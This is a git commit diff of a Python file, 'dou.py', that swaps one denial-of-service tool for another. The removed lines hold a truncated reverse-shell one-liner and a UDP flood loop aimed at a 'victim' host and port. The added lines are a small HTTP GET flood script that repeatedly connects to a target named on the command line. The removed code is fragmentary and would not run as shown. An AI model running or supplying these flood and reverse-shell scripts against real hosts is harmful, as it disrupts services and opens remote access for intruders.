5e7835b14ef096361c258af4dcfec63f2444e495
vilesis <48322198+vilesis@users.noreply.github.com>
2019-06-15 17:26:40 -0300

    Update dou.py

--- dou.py
+++ dou.py
@@ -1,24 +1,14 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(
-    # 1024 representes one byte to the server
-    bytes = random._urandom(65535)
-    timeout =  time.time() + duration
-    sent = 0
-
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
-
-def main():
-    print len(sys.argv)
-    if len(sys.argv) != 4:
-        usage()
-    else:
-        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-
-if __name__ == '__main__':
-    main()
+    #!/usr/bin/python  
+    import socket, sys, os  
+    print "][ Attacking " + sys.argv[1]  + " ... ]["  
+    print "injecting " + sys.argv[2];  
+    def attack():     
+        #pid = os.fork()  
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+        s.connect((sys.argv[1], 80))  
+        print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
+        s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
+        s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
+        s.close()  
+    for i in range(1, 10):  
+        attack()  
